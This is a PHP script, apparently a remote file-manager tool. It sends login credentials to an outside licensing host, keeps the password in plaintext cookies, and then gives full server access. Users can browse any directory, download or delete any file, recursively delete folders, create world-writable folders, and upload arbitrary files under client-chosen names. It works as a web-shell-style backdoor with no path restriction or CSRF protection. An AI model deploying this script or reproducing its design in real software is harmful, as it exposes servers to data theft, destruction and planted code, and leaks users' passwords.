<?php $_REQUEST=ARRAY_MERGE($_GET, $_POST, $_COOKIE); If (!IsSet($_REQUEST['AUTH'])){?><form action="" method="post"><table><tr><td>User:</td><td><input type="text" name="AUTH[USER]"></td></tr><tr><td>Password:</td><td><input type="password" name="AUTH[PASSWORD]"></td></tr><tr><td></td><td><input type="submit" value="Login"></td></tr></table></form><?php Exit; } Else{$api_login=@File_Get_Contents('http://api.dennishoppe.de/license-login/', False, Stream_Context_Create(Array( 'http'=>Array( 'method'=>'POST', 'header'=>'Content-type: application/x-www-form-urlencoded', 'content'=>HTTP_Build_Query(Array( 'user'=>$_REQUEST['AUTH']['USER'], 'password'=>$_REQUEST['AUTH']['PASSWORD']),Null, '&') ) ))); If (!$api_login) Die('Sorry, could not connect to API endpoint.'); ElseIf ($api_login=='false'){Header('HTTP/1.0 401 Unauthorized'); Die('Unauthorized: Wrong username/password combination'); } Else{SetCookie('AUTH[USER]', $_REQUEST['AUTH']['USER']); SetCookie('AUTH[PASSWORD]', $_REQUEST['AUTH']['PASSWORD']); } } class Filebrowser{var $action; var $directory; var $file; function __construct(){$this->action=IsSet($_REQUEST['action']) ? StrToLower($_REQUEST['action']) : 'browse'; $this->directory=IsSet($_REQUEST['dir']) ? RealPath($_REQUEST['dir']).'/' : RealPath('.').'/'; $this->file=IsSet($_REQUEST['file']) ? $_REQUEST['file'] : Null; } function get_subfolder($directory){$arr_folder=(Array) Glob($directory.'{,.}*', GLOB_BRACE+GLOB_ONLYDIR); $sort_order=Array(); ForEach ($arr_folder AS $index=>$folder){$path=RealPath ($folder).'/'; If (!Is_Dir($path) || BaseName($folder)=='.' || BaseName($folder)=='..') Unset ($arr_folder[$index]); Else{$arr_folder[$index]=$path; $sort_order[$index]=StrToLower($folder); } } Array_Multisort($sort_order, $arr_folder); return $arr_folder; } function get_files ($directory){$arr_file=(Array) Glob($directory.'{,.}*', GLOB_BRACE); $sort_order=Array(); ForEach ($arr_file AS $index=>$file){$path=RealPath ($file); If (!Is_File($path)) Unset ($arr_file[$index]); Else{$arr_file[$index]=$path; $sort_order[$index]=StrToLower($file); } } Array_Multisort($sort_order, $arr_file); return $arr_file; } function build_link($action, $dir=False, $file=False){$link=SPrintF('?%s', HTTP_Build_Query(Array( 'action'=>$action, 'dir'=>$dir ? $dir : Null, 'file'=>$file ? $file : Null),Null, '&')); return $link; } function html_link($action, $dir='', $file='', $caption){PrintF('<a href="%1$s" title="%2$s">%2$s</a>', HTMLSpecialChars($this->build_link($action, $dir, $file)),$caption); } function delete_folder($directory){ForEach ((Array) $this->get_subfolder($directory) AS $folder){$this->delete_folder($folder); } ForEach ((Array) $this->get_files($directory) AS $file){Unlink($file); } RmDir($directory); } } $filebrowser=New Filebrowser; If ($filebrowser->action=='browse') : ?><!DOCTYPE HTML><html><head><title>Browse: <?php Echo BaseName($filebrowser->directory) ?>/</title><meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head><body><h1>Filebrowser</h1><h2><?php Echo HTMLSpecialChars($filebrowser->directory) ?></h2><p><big>&uarr; <?php $filebrowser->html_link('browse', DirName($filebrowser->directory),'', 'Go one directory upwards.') ?></big></p><?php If($arr_folder=$filebrowser->get_subfolder($filebrowser->directory)) : ?><h2>Sub folder</h2><ul><?php ForEach ($arr_folder AS $index=>$folder) : ?><li><?php $filebrowser->html_link('browse', $folder, '', BaseName($folder)) ?> &mdash; [<small><?php $filebrowser->html_link('delfolder', $folder, '', 'delete') ?></small>] </li><?php EndForEach; ?></ul><?php EndIf; ?><?php If($arr_file=$filebrowser->get_files($filebrowser->directory)) : ?><h2>Files</h2><ul><?php ForEach ($arr_file AS $index=>$file) : ?><li><?php $filebrowser->html_link('getfile', '', $file, BaseName($file)) ?> &mdash; [<small><?php $filebrowser->html_link('delfile', '', $file, 'delete') ?></small>] </li><?php EndForEach; ?></ul><?php EndIf; ?><h2>Upload a new file in this directory</h2><form action="?action=uploadfile" method="post" enctype="multipart/form-data"><p><input type="hidden" name="dir" value="<?php Echo $filebrowser->directory ?>"><input type="file" name="file"><input type="submit" value="Upload"></p></form><h2>Create a new folder in this directory</h2><form action="?action=createfolder" method="post"><p><input type="hidden" name="dir" value="<?php Echo $filebrowser->directory ?>"><input type="text" name="folder"><input type="submit" value="Create"></p></form></body></html><?php ElseIf ($filebrowser->action=='getfile') : Header('Status: 200'); Header('Content-Type: application/' . PathInfo($filebrowser->file, PATHINFO_EXTENSION)); Header(SPrintF('Content-Disposition: attachment; filename="%s"', BaseName($filebrowser->file))); Header('Content-Length:' . FileSize($filebrowser->file)); ReadFile ($filebrowser->file); Exit; ElseIf ($filebrowser->action=='delfile') : Unlink ($filebrowser->file); Header('Status: 307'); Header('Location: ' . $filebrowser->build_link('browse', DirName($filebrowser->file))); Exit; ElseIf ($filebrowser->action=='uploadfile') : Copy ($_FILES['file']['tmp_name'], $filebrowser->directory.$_FILES['file']['name']); Header('Status: 307'); Header('Location: ' . $filebrowser->build_link('browse', $filebrowser->directory)); Exit; ElseIf ($filebrowser->action=='createfolder') : $new_folder=$filebrowser->directory . Trim($_REQUEST['folder']); MKDir($new_folder, 0777, True); Header('Status: 307'); Header('Location: ' . $filebrowser->build_link('browse', $filebrowser->directory)); Exit; ElseIf ($filebrowser->action=='delfolder') : $filebrowser->delete_folder($filebrowser->directory); Header('Status: 307'); Header('Location: ' . $filebrowser->build_link('browse', DirName($filebrowser->directory))); Exit; EndIf;